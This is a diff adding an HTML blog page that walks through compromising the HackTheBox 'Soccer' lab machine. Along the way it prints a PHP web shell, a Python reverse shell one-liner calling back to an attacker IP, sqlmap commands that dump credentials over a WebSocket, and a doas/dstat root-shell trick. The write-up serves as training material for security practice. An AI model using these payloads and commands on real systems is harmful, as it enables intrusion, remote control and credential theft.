@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<style>
+    body {
+        background-color: #363636;
+        /* background-color:bisque; */
+        color: whitesmoke;
+        font-family:Arial, Helvetica, sans-serif
+    }
+
+    a {
+        text-decoration: none; 
+        color: inherit;
+    }
+
+    .topnav {
+        background-color: #242424;
+        overflow: hidden;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        right: 0;
+    }
+
+    .topnav .name {
+        float: left;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-size: 17px;
+    }
+
+    .topnav a {
+        float: right;
+        color: #f2f2f2;
+        text-align: center;
+        padding: 14px 16px;
+        font-size: 17px;
+    }
+
+
+    .topnav a:hover {
+        background-color: #ddd;
+        text-decoration-line: underline;
+        color: black;
+    }
+
+    .topnav a.active {
+        background-color:#0077ff;
+        color:white;
+    }
+
+    .topnav .center-topnav {
+        margin: auto;
+        width: 80%;
+        max-width: 930px
+    }
+
+    .content {
+        margin: auto;
+        width: 80%;
+        max-width: 900px;
+        padding-top: 50px;
+        display: grid;
+        line-height: 1.5em;
+        /* border-color: #0077ff; border-width: 2px; border-style: solid; */
+    }
+
+
+
+    .content p {
+        margin-bottom:0px;
+    }
+
+    /* .content .cell {
+        border-color: green;
+        border-width: 2px;im al
+        border-style: solid;
+    } */
+
+    .content .cell .text {
+        margin:auto;
+        text-align: center;
+    }
+
+    .content h2 {
+        margin-top:40px;
+        margin-bottom:0px;
+    }
+
+    .content h3 {
+        margin-bottom:0px;
+    }
+
+    .content .box-icon {
+        display: block;
+        width: 20%;
+    }
+
+    pre {
+        overflow: auto;
+    }
+
+    pre code {
+        background-color: #000;
+        border: 1px solid #999;
+        display: block;
+        padding: 15px;
+        overflow: auto;
+    }
+
+    img {
+        margin-top: 10px;
+        width: 80%
+    }
+
+    h1, h2 {
+        color:#0077ff
+    }
+
+    h3 {
+        color:#99c9ff
+    }
+
+</style>
+
+<head>
+    <div class="topnav">
+        <div class="center-topnav">
+            <a href=/index.html class="name">Jaguar Perlas</a>
+            <a class="active" href="/hack/hacks/index.html">Hacks</a>
+            <a href="/hack/about.html">About me</a>
+            <a href="/hack/index.html">Home</a>
+        </div>
+    </div>
+</head>
+
+<body>
+    <div class="content">
+
+        <h1>[Easy] Soccer</h1>
+        <img class="box-icon" src="/hack/images/soccer.png"></img>
+        <p><i>Full compromise on April 16, 2023</br>Written on March 18, 2024</i></p>
+        <p>Soccer is my eighth machine to compromise on HackTheBox. This Linux machine features a file upload web application with default credentials,
+            foothold via uploading a PHP web shell, SQL injection, and a binary that can be run as root via doas.
+        </p>
+        <h2>Enumeration</h2>
+        <h3>Nmap</h3>
+        <p>Let's start with an Nmap scan.</p>
+        <pre><code>nmap 10.10.11.194 -p- --min-rate=5000</code></pre>
+        <img src="../images/soccer2.png">
+        <p>Ports 22, 80, and 9091 are open. Let's use Nmap scripts to get more information from those ports.</p>
+        <pre><code>nmap 10.10.11.194 -p22,80,9091 -sC -sV --min-rate=3000</code></pre>
+        <img src="../images/soccer3.png">
+        <h3>Port 80 - TCP</h3>
+        <p>Navigating to http://10.10.11.194, we encounter an error. This is because the website is redirecting us to http://soccer.htb, but our machine does not
+            know the IP address of soccer.htb.</p>
+        <img src="../images/soccer4.png">
+        <p>To fix this, we configure out /etc/hosts file to map soccer.htb to 10.10.11.194.</p>
+        <pre><code>echo "10.10.11.194" soccer.htb | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/soccer5.png">
+        <p>Now we can browse http://soccer.htb. We are presented with the HTB FootBall Club page.</p>
+        <img src="../images/soccer6.png">
+        <p>On the website, there isn't much to click on. I then fuzzed for any possible directories and found one directory named tiny.</p>
+        <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://soccer.htb/FUZZ</code></pre>
+        <img src="../images/soccer7.png">
+        <p>Navigating to http://soccer.htb/tiny brings us a login page to Tiny File Manager.</p>
+        <img src="../images/soccer8.png">
+        <p>A quick Google search for default credentials shows us a username and password that could work.</p>
+        <img src="../images/soccer9.png">
+        <p>It works. We are logged in.</p>
+        <img src="../images/soccer10.png">
+
+        <h2>Foothold to www-data</h2>
+        <p>Poking around, it seems we can upload files here. The file manager is using PHP which means we could possibly upload a PHP web shell to get RCE.</p>
+        <img src="../images/soccer11.png">
+        <p>For my web shell, I uploaded the following PHP file:</p>
+        <pre><code>&lt;?php system($_GET['cmd']); ?></code></pre>
+        <img src="../images/soccer12.png">
+        <p>The upload succeeds. We can see our file uploaded. If we click on our uploaded file, we are given the option to open it.</p>
+        <img src="../images/soccer13.png">
+        <img src="../images/soccer14.png">
+        <p>Opening our file and appending ?cmd=id to the end of the url confirms RCE, as the target machine executed the id command.</p>
+        <img src="../images/soccer15.png">
+        <p>Next we'll get a reverse shell on the target. We'll first set up our listener on our machine.</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="../images/soccer16.png">
+        <p>Then we'll use the web shell to execute Python code to send a reverse shell to our listener. We used the following payload from revshells.com:</p>
+        <pre><code>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'</code></pre>
+        <p>Our listener received the reverse shell. We're in the target machine.</p>
+        <img src="../images/soccer17.png">
+        <p>Enumerating the file system, there is another existing user named "player".</p>
+        <img src="../images/soccer18.png">
+        <p>Unfortunately, the user.txt flag is not readable with our current user.</p>
+        <img src="../images/soccer19.png">
+        <p>Seeing what ports are open, there are pretty interesting ones open locally. Ports 3306 indicate a possible MySQL instance, and port 3000 can be worth investigating as it is unusual.</p>
+        <pre><code>netstat -ano</code></pre>
+        <img src="../images/soccer20.png">
+        <p>If we curl localhost on port 3000, we get a response which looks like a website. Looking closely, it's the same website as port 80 but this time it has a login page.</p>
+        <pre><code>curl localhost:3000</code></pre>
+        <img src="../images/soccer21.png">
+        <p>My first instinct was to use proxychains to visit the internal website directly from my attack machine, but I decided to enumerate the file system for the config files.
+            By looking around, we find that the website is running Nginx and has two site files in /etc/nginx/sites-enabled.</p>
+        <img src="../images/soccer22.png">
+        <p>The file named default contains configurations for the soccer.htb on port 80. There's nothing of interest. However, on the file named soc-player.soccer.htb, we can see
+            it is configured to listen on the same port but on a different subdomain. Then it will forward all requests to http://localhost:3000. </p>
+        <img src="../images/soccer23.png">
+        <p>We'll add soc-player.htb to our /etc/hosts file.</p>
+        <pre><code>echo "10.10.11.194" soc-player.soccer.htb | sudo tee -a /etc/hosts</br>cat /etc/hosts</code></pre>
+        <img src="../images/soccer24.png">
+        <p>Navigating to http://soc-player.soccer.htb, we're able to see the hidden website.</p>
+        <img src="../images/soccer25.png">
+        <p>There is a login option but our known credentials don't work. We can create an account instead.</p>
+        <img src="../images/soccer26.png">
+        <p>Upon logging in, we are faced with interface with a single input box.</p>
+        <img src="../images/soccer27.png">
+        <h2>Exploit - SQL Injection to player</h2>
+
+        <p>This interface tells us whether a ticket with the inputted ID exists or not. This could be either command injection or SQL injection.
+            I first tried with a single quotation mark, but that didn't work. The interface behaved expectedly and told us "Ticket doesn't exist".
+            After some playing around, I noticed that the interface is asking for an ID, which is an integer. In an SQL statement, integers don't need
+            quotation marks. Most SQL injection tutorials will tell you to put a single quotation mark to end the app's SQL statement so you can input your own
+            arbitrary SQL statement, but this is not the case. If I were to input the following, then it evaluates as True and shows that the ticket exists, even though
+            it clearly doesn't.</p>
+        <pre><code>123 or 1=1</code></pre>
+        <img src="../images/soccer28.png">
+        <p>This means we have a SQL injection vulnerability. Let's use sqlmap to automate this.</p>
+        <p>Normally I would use Burpsuite to intercept the request, copy it entirely, and paste it to a text file for sqlmap to process. When intercepting this
+            request, I noticed it was a WebSockets message to port 9091.</p>
+        <img src="../images/soccer29.png">
+        <p>This does not take any authentication or cookies. The WebSocket on port 9091 will process all requests as long as they have the "id" key in JSON format.
+            We can simply tell sqlmap to start testing on ws://soc-player.soccer.htb:9091 and test the value for "id". Sqlmap does find a time-based SQL injection vulnerability.</p>
+        <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"test"}'</code></pre>
+        <img src="../images/soccer30.png">
+        <p>Time-based injections are too slow to extract data. If we increase the level and risk, we find a boolean-based injection vulnerability which is much faster.</p>
+        <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"test"}' --level 5 --risk 3</code></pre>
+        <img src="../images/soccer31.png">
+        <p>Now I'll extract all database names.</p>
+        <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"test"}' --dbs</code></pre>
+        <img src="../images/soccer32.png">
+        <p>The soccer_db database is interesting. Let's extract the table names.</p>
+        <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"test"}' -D soccer_db --tables</code></pre>
+        <img src="../images/soccer33.png">
+        <p>Only one table named accounts. Interesting. Let's see what data is inside.</p>
+        <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"test"}' -D soccer_db -T account --dump</code></pre>
+        <img src="../images/soccer34.png">
+        <p>It looks like it's the password for the user "player". We can SSH into the target machine as "player" to verify.</p>
+        <pre><code>ssh player@10.10.11.194</br>PlayerOftheMatch2022</code></pre>
+        <img src="../images/soccer35.png">
+        <p>We got user flag.</p>
+        <img src="../images/soccer36.png">
+
+        <h2>Privilege Escalation to root</h2>
+        <p>Following typical enumeration for possible privilege escalation (I try not to use linpeas), we find an unusual SUID binary: doas.</p>
+        <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+        <img src="../images/soccer37.png">
+        <p>The binary doas is similar to sudo. It's pretty much its name: "<b>do</b> X (thing) <b>as</b> Y (user)". The usual path for doas.conf is /etc/doas.conf
+            but it's not there. With some looking around, it's at /usr/local/etc/doas.conf</p>
+        <img src="../images/soccer38.png">
+        <p>The file doas.conf tells us that user player is allowed to run /usr/bin/dstat as root. Searching the binary dstat on GTFObins, we can see how we can
+            take advantage of this and get root.</p>
+        <img src="../images/soccer39.png">
+        <p>Modifying the command to fit our situation, we're able to spawn a root shell and get the root flag.</p>
+        <pre><code>echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py</br>doas /usr/bin/dstat --xxx</code></pre>
+        <img src="../images/soccer40.png">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+</bo11dy>
+
+</html>
